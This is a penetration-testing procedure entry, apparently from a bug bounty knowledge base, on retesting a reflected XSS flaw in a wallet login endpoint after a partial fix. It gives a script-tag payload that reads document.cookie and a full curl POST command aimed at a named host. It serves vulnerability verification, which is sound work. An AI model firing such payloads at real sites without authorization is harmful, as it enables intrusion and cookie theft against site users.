---
id: proc-retest-simpler-xss
tags:
  - xss
  - retest
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/retest-xss-script-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:35.284Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Retest XSS with Simpler Payload After Fix

## Summary

After an initial fix attempt, retest the login endpoint with a direct <script> tag payload to check if sanitization issues persist, allowing automatic execution on page load.

## Description

The reported fix may have addressed event handlers but not script tags. This procedure uses a simpler payload that executes immediately upon reflection, bypassing interaction needs and confirming ongoing vulnerability.

## Requirements

1. Updated CSRF token from the form
2. curl or equivalent for POST submission
3. Access to the endpoint post-fix

## Defense

Defensive measures and detection strategies:

- Parse and strip all script tags and inline JavaScript from inputs
- Conduct thorough regression testing after patches
- Use automated scanners to verify XSS fixes across payloads

## Objectives

1. Validate fix effectiveness with varied payloads
2. Demonstrate auto-execution for higher impact
3. Highlight incomplete remediation

## Instructions

### Step 1: Prepare Simpler Payload

**Context**: Craft a direct script injection.

**Command** ([[commands/retest-xss-script-payload]]):
```bash
# Payload: email[]=<script>alert(document.cookie)</script>
```

> Use a dummy password and current CSRF.

### Step 2: Submit and Observe

**Context**: Send and load the response.

**Command** ([[commands/retest-xss-script-payload]]):
```bash
curl -X POST https://wallet.romit.io/login \
  -d "email[]=<script>alert(document.cookie)</script>&password=test&_csrf=example-token" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

> Open the error page; alert should fire automatically.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques

- None

## Commands Used

- [[commands/retest-xss-script-payload]]

## Tools Used

- None

## Tags

- [[xss]]
- [[script-tag]]
- [[retest]]
